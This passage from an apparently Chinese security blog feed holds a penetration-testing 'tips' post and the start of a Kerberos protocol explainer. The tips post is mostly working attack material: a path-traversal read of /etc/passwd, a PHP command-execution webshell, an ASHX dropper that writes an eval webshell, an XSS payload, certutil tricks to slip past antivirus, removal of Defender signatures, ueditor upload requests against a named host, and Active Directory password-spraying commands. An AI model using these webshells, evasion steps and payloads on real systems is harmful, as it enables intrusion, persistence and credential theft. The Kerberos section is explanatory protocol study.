class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">lancher</span><span class="hljs-selector-class">.py</span><br></code></pre></td></tr></table></figure><hr><p>易受攻击点</p><p><a href="https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA">https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA</a></p><hr><p>cisco asa任意文件读取</p><p><a href="https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py">https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py</a></p><hr><h4 id="Exchange-CVE-2020-17144"><a href="#Exchange-CVE-2020-17144" class="headerlink" title="Exchange CVE-2020-17144"></a>Exchange CVE-2020-17144</h4><p>poc: <a href="https://srcincite.io/pocs/cve-2020-17141.py.txt">https://srcincite.io/pocs/cve-2020-17141.py.txt</a></p><h4 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h4><p>poc: <a href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p><hr><p>citrix xenmobile任意文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/jsp/</span>help-sb-download.jsp?sbFileName=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><hr><p>vmware文件读取：</p><p><a href="https://twitter.com/ptswarm/status/1316016337550938122">https://twitter.com/ptswarm/status/1316016337550938122</a></p><hr><p>内网不出网</p><p><a href="https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg">https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg</a></p><p>dnscat</p><hr><p>mysql 8.0新特性</p><ul><li><p>table:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]<br></code></pre></td></tr></table></figure></li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201210193347-9156b91a-3adb-1.png" alt="img"></p><ul><li><p>value: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where id &#x3D; 1 union values row(1,2,3)<br></code></pre></td></tr></table></figure><hr></li></ul><p>当php system没有调用cmd权限</p><p>通过建立新的com对象调用其他的cmd.exe</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[a];<br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> COM(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);   <span class="hljs-comment">// 生成一个COM对象</span><br><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;exec(<span class="hljs-string">&#x27;cmd.exe /c &#x27;</span>.<span class="hljs-variable">$command</span>); <span class="hljs-comment">//调用对象方法来执行命令</span><br><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;StdOut();<br><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;ReadAll();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><p>xss payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;%00EEEE&lt;svg /\/\<span class="hljs-comment">//ONLoad=&#x27;a\u006c\u0065\u0072\u0074(1)&#x27;/\/\/\&gt;svg&gt;%0APayload</span><br></code></pre></td></tr></table></figure><hr><p>通过certutil进行编码解码文件bypass杀软</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编码</span><br>Certutil -encode d:\artifact.exe d:\artifact.txt<br><br><span class="hljs-comment"># 写入</span><br><span class="hljs-built_in">echo</span> sfAFASFAsfasgasdf………&gt;&gt;d:\1.txt<br><br><span class="hljs-comment"># 解码</span><br>Certutil -decode d:\art.txt d:\art.exe<br></code></pre></td></tr></table></figure><hr><p>关闭defender</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>C:\PROGRA~1\WINDOW~1&gt;MpCmdRun.exe -RemoveDefinitions -all<br>MpCmdRun.exe -RemoveDefinitions -all<br><br>Service Version: 4.18.1812.3<br>Engine Version: 1.1.17600.5<br>AntiSpyware Signature Version: 1.327.2026.0<br>AntiVirus Signature Version: 1.327.2026.0<br>NRI Engine Version: 1.1.17600.5<br>NRI Signature Version: 1.327.2026.0<br><br>Starting engine and signature rollback to none...<br>Done!<br></code></pre></td></tr></table></figure><hr><p>站库分离操作内容</p><ul><li><p>mysql</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select @@hostname;                                 &#x2F;&#x2F;服务端主机名称<br>select * from information_schema.PROCESSLIST;      &#x2F;&#x2F;客户端主机名称和端口<br><br>select load_file(&#39;C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts&#39;);   &#x2F;&#x2F;读取文件<br>&#x2F;etc&#x2F;hosts<br>&#x2F;etc&#x2F;apache2&#x2F;apache2.conf<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf<br>&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules          &#x2F;&#x2F;获取网卡名称<br>&#x2F;etc&#x2F;network&#x2F;interfaces                            &#x2F;&#x2F;DHCP或静态IP<br>&#x2F;var&#x2F;lib&#x2F;dhclient&#x2F;dhclient--网卡.lease             &#x2F;&#x2F;DHCP<br>&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-网卡          &#x2F;&#x2F;静态IP<br>C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts<br>C:&#x2F;Windows&#x2F;system32&#x2F;inetsrv&#x2F;MetaBase.xml<br>C:&#x2F;Windows&#x2F;System32&#x2F;inetsrv&#x2F;config&#x2F;applicationHost.config<br>C:&#x2F;phpStudy&#x2F;Apache&#x2F;conf&#x2F;httpd.conf<br>C:&#x2F;phpStudy&#x2F;Apache&#x2F;conf&#x2F;vhosts.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;Apache&#x2F;conf&#x2F;httpd.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;Apache&#x2F;conf&#x2F;vhosts.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;nginx&#x2F;conf&#x2F;vhosts.conf<br></code></pre></td></tr></table></figure></li><li><p>mssql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">select host_name();                       &#x2F;&#x2F;客户端主机名称<br>select @@servername;                      &#x2F;&#x2F;服务端主机名称<br>select serverproperty(&#39;MachineName&#39;);     &#x2F;&#x2F;服务端主机名称<br><br>select name from master.sys.sysdatabases;    &#x2F;&#x2F;查看连接到数据库的机器名<br>select * from master.sys.sysprocesses where dbid&#x3D; db_id(&#39;sqlinject&#39;);<br></code></pre></td></tr></table></figure></li><li><p>模拟令牌</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">只要有主机在使用Windows身份验证连接到这台数据库服务器的MSSQL时就会保留当前登录用户的令牌，而大多数人又都是以默认Administrator管理员来安装的MSSQL，所以能够直接获取到Administrator令牌。<br><br><span class="hljs-comment"># msf</span><br>meterpreter &gt; use Incognito<br></code></pre></td></tr></table></figure></li></ul><hr><p>ashx webshell</p><ul><li>会自己生成一个aspx webshell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ WebHandler Language&#x3D;&quot;C#&quot; Class&#x3D;&quot;Handler&quot; %&gt; <br>using System; <br>using System.Web; <br>using System.IO; <br>public class Handler : IHttpHandler &#123; <br>    public void ProcessRequest (HttpContext context) &#123; <br>        context.Response.ContentType &#x3D; &quot;text&#x2F;plain&quot;; <br>        string show&#x3D;&quot;&lt;%@ Page Language&#x3D;\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;chopper\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;; <br>        StreamWriter file1&#x3D; File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); <br>        file1.Write(show); <br>        file1.Flush(); <br>        file1.Close(); <br>    &#125; <br>    public bool IsReusable &#123; <br>        get &#123; <br>            return false; <br>        &#125; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><hr><p>ssh 反向端口转发</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">-R</span> 0.0.0.0<span class="hljs-selector-pseudo">:rport</span><span class="hljs-selector-pseudo">:localhost</span><span class="hljs-selector-pseudo">:lport</span> <span class="hljs-selector-tag">root</span><span class="hljs-keyword">@x</span>.x.x.x<br></code></pre></td></tr></table></figure><hr><p>禁用theme主题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; EnableTheming &#x3D; &quot;False&quot; StylesheetTheme&#x3D;&quot;&quot; Theme&#x3D;&quot;&quot; %&gt;<br></code></pre></td></tr></table></figure><hr><p>ue不出网利用</p><ul><li><p>上传本地</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ueditor/net/controller.ashx?action=uploadimage</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>pmp.csc.com.cn<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------19350128512434<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>199<br><br>-----------------------------19350128512434<br>Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;delicious.png&quot;<br>Content-Type: image/png<br><br>123<br>-----------------------------19350128512434--<br></code></pre></td></tr></table></figure></li><li><p>抓取本地图片写入webshell</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ueditor/net/controller.ashx?action=catchimage</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>pmp.csc.com.cn<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>99<br><br>source%5B%5D=http://127.0.0.1/App_Upload/ueditor/image/20210116/6374641084286323059465749.png?.html<br></code></pre></td></tr></table></figure><ul><li>如果不成就换几个端口试试</li></ul></li></ul><hr><p>常见web系统弱口令</p><p><a href="http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/</a></p><hr><p>域外枚举以及爆破</p><p><a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></p><ul><li><p>EnumADUser.py</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">EnumADUser</span><span class="hljs-selector-class">.py</span> 192.168.60.1 <span class="hljs-selector-tag">test</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">tcp</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="Image"></p></li><li><p>ADPwdSpray.py</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">python2</span> <span class="hljs-selector-tag">ADPwdSpray</span><span class="hljs-selector-class">.py</span> 192.168.60.1 <span class="hljs-selector-tag">hacke</span><span class="hljs-selector-class">.testlab</span> <span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">clearpassword</span> <span class="hljs-selector-tag">QWE123</span>!@# tcp<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="Image"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> ADPwdSpray.py <span class="hljs-number">192.168.60.1</span> hacke.testlab user.txt ntlmhash <span class="hljs-number">35</span>c<span class="hljs-number">83173</span>a<span class="hljs-number">6</span>fb<span class="hljs-number">6</span>d<span class="hljs-number">142</span>b<span class="hljs-number">0359381</span>d<span class="hljs-number">5</span>cc<span class="hljs-number">84</span>c udp<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="Image"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tips</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KERBEROS详解</title>
    <link href="/2021/02/03/kerberos/"/>
    <url>/2021/02/03/kerberos/</url>
    
    <content type="html"><![CDATA[<h1 id="KERBEROS详解"><a href="#KERBEROS详解" class="headerlink" title="KERBEROS详解"></a>KERBEROS详解</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在Kerberos协议中主要是有三个角色的存在：</p><ol><li>访问服务的Client(以下表述为Client 或者用户)</li><li>提供服务的Server(以下表述为服务)</li><li>KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li></ol><p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p><p><img src="C:\Users\Mi\AppData\Roaming\Typora\typora-user-images\image-20210126111431232.png" alt="image-20210126111431232"></p><ol><li>ASREQ: Client向KDC发起ASREQ,请求凭据是Client hash加密的时间戳</li><li>AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</li><li>TGSREQ: Client凭借TGT票据向KDC发起针对特定服务的TGSREQ请求</li><li>TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</li><li>AP_REQ: Client拿着TGS票据去请求服务</li><li>AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</li></ol><h2 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><ul><li><p><strong><em>pvno</em></strong>：kerberos 版本号</p></li><li><p><strong><em>msg_type</em></strong>：类型，ASREQ对应的就是KRBAS_REQ(0x0a)</p></li><li><p><strong><em>PA_DATA</em></strong>：认证信息（在这个阶段主要关注两个字段）</p><ul><li><p><strong><em>ENC_TIMESTAMP</em></strong></p><p>这个是预认证，就是用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过</p></li><li><p><strong><em>PAPACREQUEST</em></strong></p><p>这个是启用PAC支持的扩展。PAC(Privilege Attribute Certificate)并不在原生的kerberos里面，是微软引进的扩展。PAC包含在ASREQ的响应body(ASREP)。这里的value对应的是include=true或者include=false(KDC根据include的值来判断返回的票据中是否携带PAC)。</p></li></ul></li><li><p><strong><em>REQ_Body</em></strong>：flag字段</p><ul><li><p><strong><em>cname</em></strong>：请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于<strong>枚举域内用户名</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">PrincipalName 类型。<span class="hljs-comment"># PrincipalName包含type和value。</span><br><br>KRBNTPRINCIPAL = 1 <span class="hljs-comment"># means just the name of the principal 如daizhibin</span><br>KRBNTSRV_INST = 2 <span class="hljs-comment"># service and other unique instance (krbtgt) 如krbtgt，cifs</span><br>KRBNTENTERPRISE_PRINCIPAL = 10 <span class="hljs-comment"># 如 user@domain.com</span><br></code></pre></td></tr></table></figure></li><li><p><strong><em>sname</em></strong>：在ASREQ里面sname是krbtgt，类型是KRBNTSRVINST</p><p>剩下的还有：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">realm</span>：域名<br><br><span class="hljs-attribute">from</span>：发送时间<br><br><span class="hljs-attribute">till</span>：到期时间，rubeus和kekeo都是<span class="hljs-number">20370913024805</span>Z，这个可以作为特征来检测工具。<br><br><span class="hljs-attribute">nonce</span>：随机生成的一个数kekeo/mimikatz nonce是<span class="hljs-number">12381973</span>，rubeus nonce是<span class="hljs-number">1818848256</span>，这个也可以用来作为特征检测工具。<br><br><span class="hljs-attribute">etype</span>：加密类型，有以下：<br>    <span class="hljs-attribute">des_cbc_crc</span> = <span class="hljs-number">1</span>,<br>    <span class="hljs-attribute">des_cbc_md4</span> = <span class="hljs-number">2</span>,<br>    <span class="hljs-attribute">des_cbc_md5</span> = <span class="hljs-number">3</span>,<br>    <span class="hljs-attribute">des3_cbc_md5</span> = <span class="hljs-number">5</span>,<br>    <span class="hljs-attribute">des3_cbc_sha1</span> = <span class="hljs-number">7</span>,<br>    <span class="hljs-attribute">dsaWithSHA1_CmsOID</span> = <span class="hljs-number">9</span>,<br>    <span class="hljs-attribute">md5WithRSAEncryption_CmsOID</span> = <span class="hljs-number">10</span>,<br>    <span class="hljs-attribute">sha1WithRSAEncryption_CmsOID</span> = <span class="hljs-number">11</span>,<br>    <span class="hljs-attribute">rc2CBC_EnvOID</span> = <span class="hljs-number">12</span>,<br>    <span class="hljs-attribute">rsaEncryption_EnvOID</span> = <span class="hljs-number">13</span>,<br>    <span class="hljs-attribute">rsaES_OAEP_ENV_OID</span> = <span class="hljs-number">14</span>,<br>    <span class="hljs-attribute">des_ede3_cbc_Env_OID</span> = <span class="hljs-number">15</span>,<br>    <span class="hljs-attribute">des3_cbc_sha1_kd</span> = <span class="hljs-number">16</span>,<br>    <span class="hljs-attribute">aes128_cts_hmac_sha1</span> = <span class="hljs-number">17</span>,<br>    <span class="hljs-attribute">aes256_cts_hmac_sha1</span> = <span class="hljs-number">18</span>,<br>    <span class="hljs-attribute">rc4_hmac</span> = <span class="hljs-number">23</span>,<br>    <span class="hljs-attribute">rc4_hmac_exp</span> = <span class="hljs-number">24</span>,<br>    <span class="hljs-attribute">subkey_keymaterial</span> = <span class="hljs-number">65</span><br></code></pre></td></tr></table></figure><h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h2></li></ul></li></ul><h3 id="字段-1"><a href="#字段-1" class="headerlink" title="字段"></a>字段</h3><p>KDC使用用户 hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</p><ul><li><p><strong><em>msg-type</em></strong>：ASREQ的响应body对应的就是KRBAS_REP(0x0b)</p></li><li><p><strong><em>crealm</em></strong>：域名</p></li><li><p><strong><em>cname</em></strong>：用户名</p></li><li><p><strong><em>ticket</em></strong>：这个ticket用于TGSREQ的认证（TGT）。是加密的，用户不可读取里面的内容（因为是使用krbtgt的hash进行加密的）。因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。</p></li><li><p><strong><em>enc_part</em></strong>：这部分是可以解密的，key是用户hash，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是session key，作为下阶段的认证密钥</p></li></ul><h2 id="TGT"><a href="#TGT" class="headerlink" title="TGT"></a>TGT</h2><p>凭据里面最核心的东西是session-key和加密的ticket。</p><p>正常我们用工具生成的凭据是.ccache和.kirbi后缀的，用mimikatz，kekeo，rubeus生成的凭据是以.kirbi后缀的。impacket 生成的凭据的后缀是.ccache。两种票据主要包含的都是session-key和加密的ticket，因此可以相互转化。</p><p>以kirbi为例介绍下该结构体。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> KRB-CRED::= [APPLICATION <span class="hljs-number">22</span>] <span class="hljs-keyword">SEQUENCE</span> &#123;<br>   pvno[<span class="hljs-number">0</span>] <span class="hljs-type">INTEGER</span>(<span class="hljs-number">5</span>),<br>   msg-<span class="hljs-keyword">type</span>[<span class="hljs-number">1</span>] <span class="hljs-type">INTEGER</span>(<span class="hljs-number">22</span>),<br>   tickets[<span class="hljs-number">2</span>] <span class="hljs-keyword">SEQUENCE</span> <span class="hljs-keyword">OF</span> Ticket,<br>   enc-part[<span class="hljs-number">3</span>] EncryptedData <span class="hljs-comment">-- EncKrbCredPart</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中ticket来自于KRBASREP部分的ticket</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">EncKrbCredPart  ::= [APPLICATION 29] SEQUENCE &#123;<br>   ticket-info     [0] SEQUENCE OF KrbCredInfo,  <span class="hljs-comment"># 这里就只用到这个</span><br>   nonce           [1] UInt32 OPTIONAL,<br>   timestamp       [2] KerberosTime OPTIONAL,<br>   usec            [3] Microseconds OPTIONAL,<br>   s-address       [4] HostAddress OPTIONAL,<br>   r-address       [5] HostAddress OPTIONAL<br>&#125;<br></code></pre></td></tr></table></figure><p>ticket-info部分的主要内容是session-key，来自于用户hash解密enc_part的部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">KrbCredInfo     ::= SEQUENCE &#123;<br>  key             [0] EncryptionKey,      sessionKey<br>  prealm          [1] Realm OPTIONAL,  <span class="hljs-comment"># 对应的是realm</span><br>  pname           [2] PrincipalName OPTIONAL, <span class="hljs-comment"># 对应的是cname</span><br>  flags           [3] TicketFlags OPTIONAL, <br>  authtime        [4] KerberosTime OPTIONAL, <span class="hljs-comment"># not require</span><br>  starttime       [5] KerberosTime OPTIONAL, <br>  endtime         [6] KerberosTime OPTIONAL,<br>  renew-till      [7] KerberosTime OPTIONAL,<br>  srealm          [8] Realm OPTIONAL, <span class="hljs-comment"># 对应的是realm</span><br>  sname           [9] PrincipalName OPTIONAL, <span class="hljs-comment"># 对应的是sname</span><br>  caddr           [10] HostAddresses OPTIONAL<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="TGSREQ"><a href="#TGSREQ" class="headerlink" title="TGSREQ"></a>TGSREQ</h2><p>TGSREQ这个阶段不需要账号密码，需要ASREP获取到的TGT凭据。需指定域控地址</p><h4 id="字段-2"><a 